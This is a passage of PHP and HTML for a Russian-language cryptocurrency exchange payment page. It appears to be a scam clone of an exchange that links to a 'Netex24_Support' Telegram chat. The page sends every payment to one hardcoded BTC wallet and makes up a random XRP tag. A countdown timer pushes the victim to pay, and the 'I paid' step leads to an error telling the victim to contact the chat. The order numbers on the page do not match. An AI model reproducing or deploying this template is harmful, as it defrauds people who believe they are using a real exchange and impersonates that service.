...
session_start();
$currency = 'BTC';
$addres = 'bc1q5wasrnjrk27cvzj66x68s5w4zg3rpj0yggth2u';
...
<head>
    ...
    <meta name="csrf-token" content="POHrcTAkl7-vVEEfmZRh6cMfJx4bp_02sBbE071i9c97howrZ2PA-MIZNlCq_xODll1JUGvJlAfSe7CB5RCHuw==">

    <link href="assets/1fbd42ed/css/bootstrap-1.css" rel="stylesheet">
    <link href="css/site-1.css" rel="stylesheet">
    <link href="css/main.min-1.css" rel="stylesheet">
</head>
...
<body>
    ...
    <div class="wrapper">
        <div class="content">
                                    ...
                                    <div class="mobile-lang">
                                        <div class="dropdown dropdown-languages">
                                            ...
                                            <ul id="w0" class="dropdown-menu">
                                                <li><a href="step2.php?transaction=16046486" tabindex="-1">ru</a></li>
                                                <li><a href="/en/step2?transaction=16046486" tabindex="-1">en</a></li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
            ...
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div class="steps__form steps__form2">
                            <h2 id="step2-h2">ОПЛАТА ЗАЯВКИ №16045453</h2>

                            <h2 id="step3-h2" class="disable">ПРОВЕРКА ОПЛАТЫ №16045453</h2>

                            <h2 id="step4-h2" class="disable">ОШИБКА ЗАЯВКИ №16045453</h2>


                            <ul class="status-line">
                                <li class="status">
                                    <svg width="20" height="7" viewbox="0 0 10 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M1 2.5L4.5 6L9.5 1" stroke="#48423B" stroke-linecap="round"></path>
                                    </svg>
                                    Верификация
                                </li>

                                <li class="status status2 active">
                                    <svg width="20" height="7" viewbox="0 0 10 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M1 2.5L4.5 6L9.5 1" stroke="#48423B" stroke-linecap="round"></path>
                                    </svg>
                                    Оплата
                            ...
                            <div class="step2-body">
                                    ...
                                    <div class="col-md-6">
                                        <div class="step2-input">
                                            <div class="step2-input-text">
                                                Номер кошелька <?= $currency ?>:
                                                <br>
                                                <input type="text" id="account" value="<?= $addres ?>" readonly="">
                                            </div>
                                            <button class="step2-input-btn btn-copy" type="button" data-id="account">
                                        ...
                                        <?php if ($_SESSION['currency'] == 'XRP') : ?>
                                            <div class="step2-input">
                                                <div class="step2-input-text">
                                                    TAG: <input type="text" id="summ_from" value="<?= rand(1111111, 9999999) ?>" style="width:110px;" readonly=""> </div>
                                                <button class="step2-input-btn btn-copy" type="button" data-id="summ_from">
                                                    <svg width="24" height="24" viewbox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM15 5L21 11V21C21 22.1 20.1 23 19 23H7.99C6.89 23 6 22.1 6 21L6.01 7C6.01 5.9 6.9 5 8 5H15ZM14 12H19.5L14 6.5V12Z" fill="black"></path>
                                                    </svg>
                                ...
                                <div class="form-bottom form-bottom-step2">
                                    <div class="timer-wrap">
                                        <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="jss210">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0 8C0 3.6 3.6 0 8 0C12.4 0 16 3.6 16 8C16 12.4 12.4 16 8 16C3.6 16 0 12.4 0 8ZM7.47 9.29L11.55 11.8C11.91 12.02 12.38 11.91 12.6 11.56C12.82 11.2 12.7 10.73 12.34 10.51L8.5 8.2V3.75C8.5 3.34 8.16 3 7.75 3C7.34 3 7 3.34 6.99 3.75V8.44C6.99 8.79 7.17 9.11 7.47 9.29Z" fill="#48423B"></path>
                                        </svg>
                                        Произведите оплату в течение: <span class="timer"></span>
                                    </div>
                                    <button class="form-btn" id="step2-btn">Я оплатил</button>
                                </div>
                            </div>

                            <div class="step-body step3-body disable">
                                <div class="spinner">
                                ...
                                <div class="step-text">
                                    <span>
                                        Сейчас мы проверяем зачисление средств от вас </span>
                                </div>
                            </div>

                            <div class="step-body step4-body disable">
                                <div class="spinner">
                                ...
                                <div class="step-text">
                                    <span>
                                        Заявка не обработана, обратитесь в онлайн чат </span>
                                </div>
                                ...
                                <div class="steps-btns">
                                    <a class="form-btn" href="/">Новый обмен</a> <a href="https://t.me/Netex24_Support" class="form-btn form-btn-chat"><img src="img/icon_chat.svg" alt="">Написать в чат</a>
                                </div>
                            </div>
                    ...
                    <div class="col-sm-6 col-xs-12">
                        <div class="footer-right">
                            <ul class="footer-menu">
                                <li>
                                    <a href="/pages/terms">Условия обмена</a>
                                </li>
    ...
    <script src="assets/6b2f09dc/jquery-1.js"></script>
    <script src="assets/32852cdd/yii-1.js"></script>
    <script src="js/main1.min-1.js"></script>
    <script src="assets/1fbd42ed/js/bootstrap-1.js"></script>
    <script>
        var orderId = 15770;
        var checkTime = 1800;
        startTimer3(3508);
